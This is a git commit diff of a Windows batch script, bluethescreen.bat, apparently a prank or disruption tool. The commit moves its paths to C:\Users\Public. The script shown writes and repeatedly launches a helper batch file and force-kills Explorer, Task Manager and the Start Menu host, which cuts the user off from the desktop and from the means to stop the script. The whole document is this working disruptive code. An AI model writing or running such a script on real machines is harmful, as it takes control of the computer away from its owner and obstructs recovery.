0d3a58918f9f614ff2384519968df91d6bece634
Blocktron17 <155554604+Blocktron17@users.noreply.github.com>
2024-05-11 18:04:32 -0500

    Update bluethescreen.bat

--- bluethescreen.bat
+++ bluethescreen.bat
@@ -1,20 +1,20 @@
 @echo off
 rem // Check if the first directory exists:
-if exist "C:\mainprogram\action.bat" (
+if exist "C:\Users\Public\mainprogram\action.bat" (
     rem // First directory exists, so create the second one:
-    start "action.bat" "C:\mainprogram\action.bat"
+    start "C:\Users\Public\mainprogram\action.bat"
 ) else (
     rem // First directory does not exist, create it:
-    mkdir "C:\mainprogram\"
+    mkdir "C:\Users\Public\mainprogram\"
     rem // Now create your nested batch file (e.g., myscript.bat) inside the second folder:
-    echo @echo off > "C:\mainprogram\action.bat"
+    echo @echo off > "C:\Users\Public\mainprogram\action.bat"
     @echo off 
-    start "action.bat" "C:\mainprogram\action.bat"
-    start "action.bat" "C:\mainprogram\action.bat"
-    start "action.bat" "C:\mainprogram\action.bat"
-    start "action.bat" "C:\mainprogram\action.bat"
+    start "action.bat" "C:\Users\Public\mainprogram\action.bat"
+    start "action.bat" "C:\Users\Public\mainprogram\action.bat"
+    start "action.bat" "C:\Users\Public\mainprogram\action.bat"
+    start "action.bat" "C:\Users\Public\mainprogram\action.bat"
     taskkill /IM "explorer.exe" /f
     taskkill /IM "Taskmgr.exe" /f
-    taskkill /IM "StartMenuExperienceHost.exe" >> "C:\Users\block\Downloads\mainprogram\action.bat"
+    taskkill /IM "StartMenuExperienceHost.exe" >> "C:\Users\Public\mainprogram\action.bat"
 )
 
